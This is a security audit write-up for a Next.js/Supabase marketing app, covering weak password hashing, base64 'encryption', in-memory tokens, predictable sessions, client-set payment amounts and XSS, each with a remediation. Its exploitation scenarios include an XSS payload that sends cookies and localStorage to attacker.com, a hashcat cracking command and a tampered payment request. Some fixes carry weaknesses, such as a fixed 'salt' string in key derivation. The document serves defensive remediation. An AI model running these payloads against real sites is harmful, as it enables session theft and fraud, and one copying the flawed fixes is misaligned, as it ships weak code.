# 🔍 DETAILED SECURITY ISSUES & FIXES

This document provides detailed technical information for each security issue found, including code examples, exploitation scenarios, and step-by-step fixes.

---

## 🔴 CRITICAL ISSUE #1: Weak Password Hashing

### Current Implementation
**File:** `src/lib/auth/server.ts`

```typescript
private hashPassword(password: string): string {
  return crypto.createHash('sha256').update(password).digest('hex')
}

private verifyPassword(password: string, hashedPassword: string): boolean {
  return this.hashPassword(password) === hashedPassword
}
```

### Why This Is Critical
- SHA-256 can compute ~1 billion hashes/second on modern GPUs
- No salt = rainbow table attacks possible
- No key stretching = brute force is trivial
- If database leaked, ALL passwords cracked in hours

### Exploitation Scenario
```
1. Attacker gains database access (SQL injection, insider threat, etc.)
2. Extracts password_hash column from users table
3. Uses hashcat with GPU: hashcat -m 1400 -a 0 hashes.txt rockyou.txt
4. Cracks 80%+ of passwords in < 24 hours
5. Uses credentials for account takeover
```

### Proper Fix
```typescript
import bcrypt from 'bcrypt'

class AuthServer {
  private async hashPassword(password: string): Promise<string> {
    const saltRounds = 12 // Minimum recommended
    return await bcrypt.hash(password, saltRounds)
  }

  private async verifyPassword(password: string, hashedPassword: string): Promise<boolean> {
    return await bcrypt.compare(password, hashedPassword)
  }

  // Update all methods to use async/await
  async signUp(email: string, password: string, ...): Promise<...> {
    const hashedPassword = await this.hashPassword(password)
    // ... rest of code
  }

  async signIn(email: string, password: string, ...): Promise<User> {
    // ... get user from database
    if (!await this.verifyPassword(password, user.password_hash)) {
      throw new Error('Invalid credentials')
    }
    // ... rest of code
  }
}
```

### Migration Strategy
```typescript
// Add migration script: scripts/migrate-passwords-to-bcrypt.js
// 1. Add new column: password_hash_bcrypt
// 2. On next login, rehash password with bcrypt
// 3. After 90 days, force password reset for remaining users
// 4. Drop old password_hash column

// In signIn method:
if (user.password_hash && !user.password_hash_bcrypt) {
  // Old SHA-256 hash
  if (this.verifyPasswordSHA256(password, user.password_hash)) {
    // Upgrade to bcrypt
    const newHash = await this.hashPassword(password)
    await supabase.from('users').update({ 
      password_hash_bcrypt: newHash,
      password_hash: null 
    }).eq('id', user.id)
    return user
  }
}
```

---

## 🔴 CRITICAL ISSUE #2: Fake Encryption (Base64 Encoding)

### Current Implementation
**File:** `src/lib/database/client.ts`

```typescript
static async encrypt(data: string): Promise<string> {
  // This is a simplified example - in production, use proper crypto
  // For now, return base64 encoded data (NOT SECURE - just for structure)
  return Buffer.from(data).toString('base64')
}

static async decrypt(encryptedData: string): Promise<string> {
  try {
    return Buffer.from(encryptedData, 'base64').toString('utf-8')
  } catch {
    throw new Error('Failed to decrypt data')
  }
}
```

### Why This Is Critical
- Base64 is encoding, NOT encryption
- Anyone with database access can decode instantly
- GDPR/CCPA require encryption of PII
- Potential fines: up to €20M or 4% of annual revenue

### Proper Fix - AES-256-GCM
```typescript
import crypto from 'crypto'

export class DataEncryption {
  private static getEncryptionKey(): Buffer {
    const key = process.env.DATA_ENCRYPTION_KEY
    if (!key || key.length < 32) {
      throw new Error('DATA_ENCRYPTION_KEY must be at least 32 characters')
    }
    // Derive a proper 32-byte key
    return crypto.scryptSync(key, 'salt', 32)
  }

  static encrypt(data: string): string {
    const algorithm = 'aes-256-gcm'
    const key = this.getEncryptionKey()
    const iv = crypto.randomBytes(16) // Initialization vector
    
    const cipher = crypto.createCipheriv(algorithm, key, iv)
    
    let encrypted = cipher.update(data, 'utf8', 'hex')
    encrypted += cipher.final('hex')
    
    const authTag = cipher.getAuthTag()
    
    // Return: iv:authTag:encrypted
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`
  }

  static decrypt(encryptedData: string): string {
    const algorithm = 'aes-256-gcm'
    const key = this.getEncryptionKey()
    
    const parts = encryptedData.split(':')
    if (parts.length !== 3) {
      throw new Error('Invalid encrypted data format')
    }
    
    const iv = Buffer.from(parts[0], 'hex')
    const authTag = Buffer.from(parts[1], 'hex')
    const encrypted = parts[2]
    
    const decipher = crypto.createDecipheriv(algorithm, key, iv)
    decipher.setAuthTag(authTag)
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8')
    decrypted += decipher.final('utf8')
    
    return decrypted
  }

  static hashForIndex(data: string): string {
    // Use HMAC for searchable hash
    const key = this.getEncryptionKey()
    return crypto
      .createHmac('sha256', key)
      .update(data.toLowerCase().trim())
      .digest('hex')
  }
}
```

### Generate Proper Encryption Key
```bash
# Generate a secure 32-byte key
node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"

# Add to .env.local:
DATA_ENCRYPTION_KEY=<generated_key_here>
```

### Migration Script
```sql
-- scripts/migrate-encryption.sql
-- 1. Add new encrypted columns
ALTER TABLE contacts ADD COLUMN email_encrypted_v2 TEXT;
ALTER TABLE contacts ADD COLUMN phone_encrypted_v2 TEXT;
ALTER TABLE contacts ADD COLUMN first_name_encrypted_v2 TEXT;
ALTER TABLE contacts ADD COLUMN last_name_encrypted_v2 TEXT;

-- 2. Run migration script to re-encrypt all data
-- 3. Drop old columns after verification
```

---

## 🔴 CRITICAL ISSUE #3: In-Memory Token Storage

### Current Implementation
**File:** `src/lib/auth/tokens.ts`

```typescript
const tokenStore = new Map<string, TokenData>()

export class TokenService {
  createVerificationToken(email: string): string {
    const token = this.generateToken()
    const expires = new Date(Date.now() + 24 * 60 * 60 * 1000)
    
    tokenStore.set(token, {
      email,
      type: 'verification',
      expires
    })
    
    return token
  }
}
```

### Why This Is Critical
- Tokens lost on server restart/deployment
- Doesn't work with multiple server instances
- Users can't verify email after deployment
- Password reset links break randomly

### Proper Fix - Database Storage
```sql
-- scripts/create-auth-tokens-table.sql
CREATE TABLE auth_tokens (
  token TEXT PRIMARY KEY,
  email TEXT NOT NULL,
  type TEXT NOT NULL CHECK (type IN ('verification', 'password_reset')),
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  used_at TIMESTAMPTZ
);

CREATE INDEX idx_auth_tokens_email ON auth_tokens(email);
CREATE INDEX idx_auth_tokens_expires ON auth_tokens(expires_at);
CREATE INDEX idx_auth_tokens_type ON auth_tokens(type);

-- Auto-cleanup expired tokens
CREATE OR REPLACE FUNCTION cleanup_expired_tokens()
RETURNS void AS $$
BEGIN
  DELETE FROM auth_tokens WHERE expires_at < NOW();
END;
$$ LANGUAGE plpgsql;

-- Run cleanup daily
-- (Set up in Supabase cron or external scheduler)
```

```typescript
// src/lib/auth/tokens.ts - Updated
import { getSupabaseAdmin } from '@/lib/database/client'
import crypto from 'crypto'

export class TokenService {
  private supabase = getSupabaseAdmin()

  generateToken(): string {
    return crypto.randomBytes(32).toString('hex')
  }

  async createVerificationToken(email: string): Promise<string> {
    const token = this.generateToken()
    const expires = new Date(Date.now() + 24 * 60 * 60 * 1000) // 24 hours
    
    const { error } = await this.supabase
      .from('auth_tokens')
      .insert({
        token,
        email,
        type: 'verification',
        expires_at: expires.toISOString()
      })
    
    if (error) {
      throw new Error('Failed to create verification token')
    }
    
    return token
  }

  async createPasswordResetToken(email: string): Promise<string> {
    const token = this.generateToken()
    const expires = new Date(Date.now() + 60 * 60 * 1000) // 1 hour
    
    const { error } = await this.supabase
      .from('auth_tokens')
      .insert({
        token,
        email,
        type: 'password_reset',
        expires_at: expires.toISOString()
      })
    
    if (error) {
      throw new Error('Failed to create password reset token')
    }
    
    return token
  }

  async validateToken(token: string, type: 'verification' | 'password_reset'): Promise<string | null> {
    const { data, error } = await this.supabase
      .from('auth_tokens')
      .select('*')
      .eq('token', token)
      .eq('type', type)
      .is('used_at', null)
      .single()
    
    if (error || !data) {
      return null
    }
    
    if (new Date(data.expires_at) < new Date()) {
      // Token expired
      await this.supabase
        .from('auth_tokens')
        .delete()
        .eq('token', token)
      return null
    }
    
    return data.email
  }

  async consumeToken(token: string): Promise<void> {
    await this.supabase
      .from('auth_tokens')
      .update({ used_at: new Date().toISOString() })
      .eq('token', token)
  }

  async cleanupExpiredTokens(): Promise<void> {
    await this.supabase
      .from('auth_tokens')
      .delete()
      .lt('expires_at', new Date().toISOString())
  }
}

export const tokenService = new TokenService()
```

---

## 🔴 CRITICAL ISSUE #4: Session Token Enumeration

### Current Implementation
```typescript
// Session token is just "session-{userId}"
const sessionToken = `session-${user.id}`
response.cookies.set('session-token', sessionToken, { ... })

// Later:
const userId = sessionToken.value.replace('session-', '')
```

### Why This Is Critical
- Predictable session tokens
- UUID enumeration possible
- Session hijacking if cookies intercepted

### Proper Fix - Random Session Tokens
```sql
-- scripts/create-sessions-table.sql
CREATE TABLE user_sessions (
  session_token TEXT PRIMARY KEY,
  user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  last_activity_at TIMESTAMPTZ DEFAULT NOW(),
  ip_address TEXT,
  user_agent TEXT
);

CREATE INDEX idx_sessions_user_id ON user_sessions(user_id);
CREATE INDEX idx_sessions_expires ON user_sessions(expires_at);
```

```typescript
// src/lib/auth/sessions.ts
import crypto from 'crypto'
import { getSupabaseAdmin } from '@/lib/database/client'

export class SessionManager {
  private supabase = getSupabaseAdmin()

  async createSession(userId: string, request?: Request): Promise<string> {
    const sessionToken = crypto.randomBytes(32).toString('hex')
    const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000) // 7 days
    
    const { error } = await this.supabase
      .from('user_sessions')
      .insert({
        session_token: sessionToken,
        user_id: userId,
        expires_at: expiresAt.toISOString(),
        ip_address: request?.headers.get('x-forwarded-for') || null,
        user_agent: request?.headers.get('user-agent') || null
      })
    
    if (error) {
      throw new Error('Failed to create session')
    }
    
    return sessionToken
  }

  async validateSession(sessionToken: string): Promise<string | null> {
    const { data, error } = await this.supabase
      .from('user_sessions')
      .select('user_id, expires_at')
      .eq('session_token', sessionToken)
      .single()
    
    if (error || !data) {
      return null
    }
    
    if (new Date(data.expires_at) < new Date()) {
      await this.deleteSession(sessionToken)
      return null
    }
    
    // Update last activity
    await this.supabase
      .from('user_sessions')
      .update({ last_activity_at: new Date().toISOString() })
      .eq('session_token', sessionToken)
    
    return data.user_id
  }

  async deleteSession(sessionToken: string): Promise<void> {
    await this.supabase
      .from('user_sessions')
      .delete()
      .eq('session_token', sessionToken)
  }

  async deleteAllUserSessions(userId: string): Promise<void> {
    await this.supabase
      .from('user_sessions')
      .delete()
      .eq('user_id', userId)
  }
}

export const sessionManager = new SessionManager()
```

---

## 🔴 CRITICAL ISSUE #5: Payment Amount Validation Missing

### Current Implementation
**File:** `src/app/api/payments/create-checkout/route.ts`

```typescript
const { userId, email, plan, amount } = await request.json()

// No validation! User can send any amount
const session = await stripe.checkout.sessions.create({
  line_items: [{
    price_data: {
      unit_amount: amount * 100, // User-controlled!
    }
  }]
})
```

### Exploitation Scenario
```javascript
// Attacker modifies frontend code or uses curl:
fetch('/api/payments/create-checkout', {
  method: 'POST',
  body: JSON.stringify({
    userId: 'their-user-id',
    email: 'attacker@example.com',
    plan: 'enterprise', // $199/month plan
    amount: 1 // Pay $0.01 instead!
  })
})
```

### Proper Fix
```typescript
// src/lib/pricing/plans.ts
export const PLAN_PRICES = {
  starter: 29,
  professional: 79,
  enterprise: 199
} as const

export function validatePlanPrice(plan: string, amount: number): boolean {
  const expectedPrice = PLAN_PRICES[plan as keyof typeof PLAN_PRICES]
  return expectedPrice !== undefined && amount === expectedPrice
}

// src/app/api/payments/create-checkout/route.ts
import { PLAN_PRICES, validatePlanPrice } from '@/lib/pricing/plans'

export async function POST(request: NextRequest) {
  const { userId, email, plan, amount } = await request.json()

  // Validate plan exists
  if (!PLAN_PRICES[plan as keyof typeof PLAN_PRICES]) {
    return NextResponse.json({ error: 'Invalid plan' }, { status: 400 })
  }

  // Validate amount matches plan
  if (!validatePlanPrice(plan, amount)) {
    return NextResponse.json({ 
      error: 'Invalid amount for selected plan',
      expected: PLAN_PRICES[plan as keyof typeof PLAN_PRICES],
      received: amount
    }, { status: 400 })
  }

  // Use server-side price, not user-provided
  const correctAmount = PLAN_PRICES[plan as keyof typeof PLAN_PRICES]

  const session = await stripe.checkout.sessions.create({
    line_items: [{
      price_data: {
        unit_amount: correctAmount * 100, // Use validated amount
      }
    }]
  })
}
```

---

## 🔴 CRITICAL ISSUE #6: XSS in Campaign Content

### Current Implementation
Multiple files render user HTML without sanitization:

```typescript
// src/app/campaigns/[type]/[id]/view/page.tsx
<div dangerouslySetInnerHTML={{ __html: campaign.html_content }} />
```

### Exploitation Scenario
```javascript
// Attacker creates campaign with malicious HTML:
const maliciousHTML = `
  <img src=x onerror="
    fetch('https://attacker.com/steal?cookie=' + document.cookie)
  ">
  <script>
    // Steal session token
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
      })
    })
  </script>
`

// When other users view this campaign, their session is stolen
```

### Proper Fix - DOMPurify
```bash
npm install isomorphic-dompurify
```

```typescript
// src/lib/security/sanitize.ts
import DOMPurify from 'isomorphic-dompurify'

export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li', 'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'div', 'span', 'blockquote', 'code', 'pre'
    ],
    ALLOWED_ATTR: [
      'href', 'src', 'alt', 'title', 'class', 'style', 'target', 'rel'
    ],
    ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    ALLOW_DATA_ATTR: false,
    ALLOW_UNKNOWN_PROTOCOLS: false
  })
}

// Usage in components:
import { sanitizeHTML } from '@/lib/security/sanitize'

<div dangerouslySetInnerHTML={{ 
  __html: sanitizeHTML(campaign.html_content) 
}} />
```

### Update All Files
```typescript
// src/app/campaigns/[type]/[id]/view/page.tsx
import { sanitizeHTML } from '@/lib/security/sanitize'

<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(campaign.html_content) }} />

// src/app/campaigns/email/new/page.tsx
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(selectedTemplate.html) }} />

// src/components/campaigns/EmailBuilder.tsx
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(renderBlockHTML(block)) }} />
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(generateHTML()) }} />

// src/components/campaigns/TemplateEditor.tsx
<div dangerouslySetInnerHTML={{ __html: sanitizeHTML(content) }} />
```

---

## 🟠 HIGH PRIORITY: Rate Limiting

### Implementation
```typescript
// src/lib/security/rate-limiter-redis.ts (if using Redis)
// OR use existing in-memory implementation for all endpoints

import { RateLimiter } from '@/lib/security/rate-limiter'

const rateLimiter = new RateLimiter()

// Create middleware
export async function withRateLimit(
  request: Request,
  identifier: string,
  config: { windowMs: number; maxRequests: number }
) {
  const result = await rateLimiter.checkRateLimit(identifier, config)
  
  if (!result.allowed) {
    return NextResponse.json(
      { 
        error: 'Too many requests',
        retryAfter: result.retryAfter 
      },
      { 
        status: 429,
        headers: {
          'Retry-After': result.retryAfter?.toString() || '60'
        }
      }
    )
  }
  
  return null // Allow request
}

// Apply to endpoints:
export async function POST(request: NextRequest) {
  const ip = request.headers.get('x-forwarded-for') || 'unknown'
  
  const rateLimitError = await withRateLimit(request, ip, {
    windowMs: 15 * 60 * 1000, // 15 minutes
    maxRequests: 100
  })
  
  if (rateLimitError) return rateLimitError
  
  // ... rest of endpoint logic
}
```

---

**Continue to SECURITY_FIXES_IMPLEMENTATION.md for step-by-step fix instructions**
